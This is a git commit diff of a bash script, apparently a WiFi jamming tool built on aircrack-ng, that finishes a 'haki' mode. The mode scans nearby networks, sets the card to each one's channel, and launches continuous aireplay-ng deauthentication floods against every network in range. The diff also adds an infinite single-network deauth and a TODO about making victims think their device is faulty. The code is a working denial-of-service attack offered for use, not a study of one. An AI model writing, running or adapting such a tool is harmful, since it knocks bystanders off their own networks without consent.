91e3d6f1c6b709d6183331c1506867768693807d
Leajian <leajian13@gmail.com>
2017-12-29 04:46:52 +0000

    Improved haki functionality
    Finished haki implementation and general overhaul of UI.

--- peri.sh
+++ peri.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 
 #TODO: Prevent a device from connecting to networks (aka make the user believe the device is problematic)
+#sudo aireplay-ng -0 $n -a $your_AP -c $mac $mon_mode --ignore-negative-one
 
 main()
 {
@@ -22,18 +23,30 @@ su_req()
 requirements()
 {
 	#aircrack-ng
-	exists=$(apt list --installed aircrack-ng 2>&1 | grep -m 1 -o "aircrack-ng")
+	aircrack=$(apt list --installed aircrack-ng 2>&1 | grep -m 1 -o "aircrack-ng")
 
-	if [ "$exists" != "aircrack-ng" ];
+	if [ "$aircrack" != "aircrack-ng" ];
 	then
 		sudo apt-get install aircrack-ng
 		clear
 		main #restart script after installation until user finally installs it
 	else
-		printf "exists" #debug info
+		printf "[OK] aircrack-ng" #debug info
 	fi
 
-	#set a trap for the end
+	#iwconfig
+	nettools=$(apt list --installed net-tools 2>&1 | grep -m 1 -o "net-tools")
+
+	if [ "$nettools" != "net-tools" ];
+	then
+		sudo apt-get install net-tools
+		clear
+		main #restart script after installation until user finally installs it
+	else
+		printf "[OK] iwconfig" #debug info
+	fi
+
+	#set a trap for the end, so we restore network manager and clean up any leftovers
 	trap clean_up EXIT
 }
 
@@ -62,6 +75,16 @@ create_working_folder()
 	fi
 }
 
+check_status()
+{
+	if [ $status -eq 0 ];
+	then
+		echo "		[!] Enable monitor mode first"
+		sleep 2
+		menu
+	fi
+}
+
 print_menu()
 {
 	print_status
@@ -69,9 +92,13 @@ print_menu()
 	echo " Main Menu"
 	echo
 	echo "   0    Exit"
-	echo "   1    Attack a selected network"
-	echo "   2    Disconnect the perimeter (WIP)"
+	echo "		Return your antenna to managed mode again, clean up and exit."
+	echo "   1    Single Haki"
+	echo "		Disconnect all users from a selected WiFi."
+	echo "   2    Haki"
+	echo "		Disconnect all users from any WiFi in your perimeter."
 	echo "   3    Toggle monitor mode"
+	echo "		Enable/Disable monitor mode of your antenna."
 	echo
 	echo -n "	Choose an option : "
 }
@@ -155,15 +182,37 @@ get_your_card()
 
 haki()
 {
+	check_status
+
 	scan 10
 
 	get_mon_mode
 
-	#send 128 deauth packets to each wifi network
+	echo "		[i] Continuously attacking these networks... "
+	echo
+	
+	local i=1
+	
 	while read essid
 	do
-		sudo aireplay-ng -0 128 -e $essid $mon_mode --ignore-negative-one
+		#get each corresponding channel for every essid found
+		target_channel=$(sed -n "${i}{p;q;}" "$PWD"/perish_dump/channels)
+
+		#synchronise the card with the target's channel
+		iwconfig $mon_mode channel $target_channel
+
+		echo "	[+] Attacking $essid"
+		#send continuously deauth packets to each wifi network
+		sudo aireplay-ng -0 0 -e $essid $mon_mode --ignore-negative-one > /dev/null 2>&1 &
+
+		((i++))
 	done < "$PWD"/perish_dump/essids
+
+	#Stopping the attack on user's will
+	echo
+	echo "		Press ENTER to stop the attack"
+	read
+	sudo killall aireplay-ng
 }
 
 
@@ -173,7 +222,7 @@ toggle_monitor()
 	get_cards
 	if [ "$num_of_CARDS" -eq 0 ]; # Bound to change if script has multi-card support
 	then
-		echo "	ERROR : Connect a wifi device first. Exiting..."
+		echo "		[!] Connect a wifi antenna first. Exiting..."
 		sleep 2
 		exit
 	fi
@@ -189,7 +238,7 @@ toggle_monitor()
 	else #give up
 		clear
 		echo
-		echo "	Unexpected error. Exiting..."
+		echo "		[!] Unexpected error. Exiting..."
 		sleep 2
 		exit
 	fi
@@ -215,6 +264,8 @@ start_mon()
 
 attack_network()
 {
+	check_status
+
 	#this creates the list of APs
 	scan 10
 	#this selects the target network (your_AP) and gets the number of attacks (n)
@@ -226,17 +277,33 @@ attack_network()
 
 	#this gets the number of monitor modes enabled
 	get_mons
-
+	
+	echo
 	if [[ "$num_of_mon_modes" -lt 1 ]]; then
-		echo "  Enable monitor mode first!"
+
+		echo "		[!] Enable monitor mode first!"
 		sleep 2
+		menu
 	else
-		echo "	Press Ctrl + C to stop the attack anytime."
+		echo "		[i] Press Ctrl + C to stop the attack anytime."
 		echo
 		sleep 3
-		#sudo aireplay-ng -0 $n -a $your_AP -c $mac $mon_mode --ignore-negative-one
-		sudo aireplay-ng -0 $n -e $target_network $mon_mode --ignore-negative-one
+
+		#synchronise the card with the target's channel
+		iwconfig $mon_mode channel $target_channel
+
+		#attack a specific network
+		echo "			[+] Attacking $essid"
+		sudo aireplay-ng -0 0 -e $target_network $mon_mode --ignore-negative-one > /dev/null 2>&1
 	fi
+	
+	#Stopping the attack on user's will
+	echo
+	echo "		Press ENTER to stop the attack"
+	read
+	sudo killall aireplay-ng
+	
+	echo "			[i] Done"
 }
 
 select_target_network()
@@ -268,13 +335,14 @@ select_target_network()
 	[1-$i] )
 		#gets only the number of line (mac in this case) you asked for
 		target_network=$(sed -n "${network}{p;q;}" "$PWD"/perish_dump/essids)
+		target_channel=$(sed -n "${network}{p;q;}" "$PWD"/perish_dump/channels)
 
 		#ask number of attacks only after you choose your victim
-		get_num_of_attacks
+		#get_num_of_attacks
 		;;
 
 	* )
-		echo "	Invalid option, try again"
+		echo "	[!] Invalid option, try again"
 		sleep 1
 		select_target_network
 		;;
@@ -290,12 +358,14 @@ scan()
 
 	awk -F "\"*;\"*" '{print $4}' "$PWD"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$PWD"/perish_dump/bssids
 	awk -F "\"*;\"*" '{print $3}' "$PWD"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$PWD"/perish_dump/essids
+	awk -F "\"*;\"*" '{print $6}' "$PWD"/perish_dump/scan_data-01.kismet.csv | tail -n 2 > "$PWD"/perish_dump/channels
 }
 
 scan_ui()
 {
 	while [ $scan_interval -gt 0 ]; do
-		echo "	Scanning, please wait $scan_interval sec"
+		echo
+		echo "		[i] Scanning, please wait $scan_interval sec"
 		sleep 1
 		clear
 		let scan_interval=scan_interval-1
@@ -305,7 +375,8 @@ scan_ui()
 get_num_of_attacks()
 {
 	echo
-	echo " How many attacks? (Usually 5 are enough to disconnect someone momentarily)"
+	echo " How many attacks? (0 means infinite)"
+	echo "		(Usually 5 are enough to disconnect someone momentarily)"
 	echo -n "	Attacks : "
 	read n
 	case $n in #TODO: Check for negative numbers
@@ -333,6 +404,7 @@ print_status()
 	echo " ==============================[STATUS]================================="
 	if [[ "$num_of_mon_modes" -lt 1 ]]; then
 		echo " Monitor mode not active"
+		status=0
 		
 		if [[ "$your_AP" == "Not-Associated" ]]; then
 			echo " You are not connected to a WiFi network!"
@@ -342,6 +414,7 @@ print_status()
 		fi
 	else
 		echo " Monitor mode active on "$mon_mode""
+		status=1
 	fi
 
 	
